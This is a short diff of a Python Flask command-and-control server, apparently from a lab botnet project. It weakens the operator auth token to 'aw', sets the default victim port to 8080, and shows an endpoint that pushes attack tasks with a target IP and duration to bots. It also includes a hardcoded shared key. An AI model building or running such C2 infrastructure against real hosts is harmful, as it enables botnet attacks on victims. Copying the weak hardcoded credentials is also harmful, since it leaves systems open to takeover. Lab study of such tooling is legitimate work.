@@ -79,7 +79,7 @@ except ImportError:
 # ── C2 shared key ─────────────────────────────────────────────
 C2_SECRET    = b"AUA_LAB_2026_KEY"   # Must match AUTH_TOKEN logic in bot_agent.c
 AES_KEY      = derive_key(C2_SECRET)
-AUTH_TOKEN   = "LAB_RESEARCH_TOKEN_2026"
+AUTH_TOKEN   = "aw"
 
 # Mutable key state — updated by /rotate_key
 _current_secret = C2_SECRET
@@ -217,7 +217,7 @@ def push_task():
 
     Common optional fields (passed through verbatim to the bot):
       target_ip   : victim IP          (default 192.168.100.20)
-      target_port : victim port        (default 80)
+      target_port : victim port        (8080)
       duration    : seconds            (default 10)
 
     Type-specific optional fields (forwarded to bot unchanged):
@@ -236,7 +236,7 @@ def push_task():
     task = {
         "type":        data.get("type", "idle"),
         "target_ip":   data.get("target_ip", "192.168.100.20"),
-        "target_port": data.get("target_port", 80),
+        "target_port": data.get("target_port", 8080),
         "duration":    data.get("duration", 10),
         "issued_at":   datetime.now().isoformat(),
     }
@@ -357,7 +357,7 @@ if __name__ == "__main__":
     print(f"\nKey rotation example:")
     print(f"  curl -X POST http://localhost:5000/rotate_key \\")
     print(f"       -H 'Content-Type: application/json' \\")
-    print(f"       -H 'X-Auth-Token: LAB_RESEARCH_TOKEN_2026' \\")
+    print(f"       -H 'X-Auth-Token: aw' \\")
     print(f"       -d '{{\"secret\":\"NEW_KEY_2026_XYZ\"}}'")
     print()
     app.run(host="0.0.0.0", port=5000, debug=False)
